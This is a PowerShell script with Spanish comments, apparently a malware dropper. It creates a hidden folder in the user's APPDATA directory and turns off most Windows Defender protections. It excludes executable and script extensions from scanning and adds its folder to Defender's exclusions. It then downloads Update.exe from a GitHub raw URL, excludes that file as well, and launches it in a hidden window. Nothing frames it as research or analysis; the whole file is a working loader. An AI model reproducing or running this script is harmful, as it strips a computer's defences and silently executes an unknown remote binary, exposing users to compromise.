# Configurar PowerShell para detenerse en errores
$ErrorActionPreference = "Stop"

# Definir ruta de instalación
$installPath = "$env:APPDATA\SubDir"

# Crear la carpeta si no existe
Write-Host "Creando la carpeta oculta: $installPath" -ForegroundColor Cyan
New-Item -Path $installPath -ItemType Directory -Force | Out-Null

# Ocultar la carpeta
Write-Host "Ocultando la carpeta..." -ForegroundColor Cyan
attrib +h "$installPath"

# Desactivar protección en tiempo real y otras funciones avanzadas
Write-Host "Desactivando Windows Defender..." -ForegroundColor Red

# Asegurarse de que Defender está completamente desactivado
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableScanningNetworkFiles $true
Set-MpPreference -DisableArchiveScanning $true
Set-MpPreference -DisablePuaScanning $true

# Desactivar la detección de archivos descargados
Set-MpPreference -DisableAutoExclusions $true
Set-MpPreference -ExcludeExtension "exe", "msi", "bat", "cmd"

Write-Host "Windows Defender debería estar desactivado." -ForegroundColor Green


# Agregar la carpeta a exclusiones de Windows Defender
Write-Host "Añadiendo $installPath a exclusiones de Windows Defender..." -ForegroundColor Cyan
powershell -Command "Add-MpPreference -ExclusionPath '$installPath'"

# Definir la URL del archivo a descargar
$fileUrl = "https://raw.githubusercontent.com/xofan15/update/main/Update.exe"
$destinationPath = "$installPath\Update.exe"

# Descargar el archivo rápidamente
Write-Host "Descargando Update.exe desde GitHub..." -ForegroundColor Cyan
Invoke-WebRequest -Uri $fileUrl -OutFile $destinationPath -UseBasicParsing

# Agregar el archivo a exclusiones de Windows Defender
Write-Host "Añadiendo Update.exe a exclusiones de Windows Defender..." -ForegroundColor Cyan
powershell -Command "Add-MpPreference -ExclusionPath '$destinationPath'"

# Ejecutar el archivo en segundo plano (oculto)
Write-Host "Ejecutando Update.exe en segundo plano..." -ForegroundColor Cyan
Start-Process -FilePath $destinationPath -WindowStyle Hidden

Write-Host "Proceso completado." -ForegroundColor Green
